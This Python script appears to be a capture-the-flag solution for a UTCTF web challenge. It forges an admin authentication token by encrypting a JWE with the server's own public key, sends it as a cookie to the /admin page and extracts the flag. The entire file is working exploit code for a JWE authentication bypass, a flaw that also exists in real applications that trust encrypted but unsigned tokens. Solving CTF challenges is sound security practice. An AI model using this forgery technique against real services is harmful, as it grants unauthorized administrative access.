#!/usr/bin/env python3

import base64
import json
import os
import re
import sys

import requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


DEFAULT_BASE = "http://challenge.utctf.live:5926"
PROTECTED_HEADER = b'{"cty":"JWT","enc":"A256GCM","alg":"RSA-OAEP-256"}'
FLAG_RE = re.compile(r"utflag\{[^}]+\}")


def b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def mint_admin_token(base_url: str) -> str:
    pub_pem = requests.get(f"{base_url}/resources/key.pem", timeout=10).text.encode()
    pubkey = serialization.load_pem_public_key(pub_pem)

    cek = os.urandom(32)
    enc_key = pubkey.encrypt(
        cek,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

    iv = os.urandom(12)
    plaintext = json.dumps({"sub": "admin"}, separators=(",", ":")).encode()
    protected_b64 = b64u(PROTECTED_HEADER).encode()

    # Compact JWE authenticates the base64url protected header as AAD.
    ciphertext_and_tag = AESGCM(cek).encrypt(iv, plaintext, protected_b64)
    ciphertext = ciphertext_and_tag[:-16]
    tag = ciphertext_and_tag[-16:]

    return ".".join(
        [
            protected_b64.decode(),
            b64u(enc_key),
            b64u(iv),
            b64u(ciphertext),
            b64u(tag),
        ]
    )


def main() -> int:
    base_url = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_BASE
    token = mint_admin_token(base_url)
    admin_page = requests.get(
        f"{base_url}/admin",
        headers={"Cookie": f"fnsb_token={token}"},
        timeout=10,
    ).text

    match = FLAG_RE.search(admin_page)
    if not match:
        print("flag not found", file=sys.stderr)
        return 1

    print(match.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
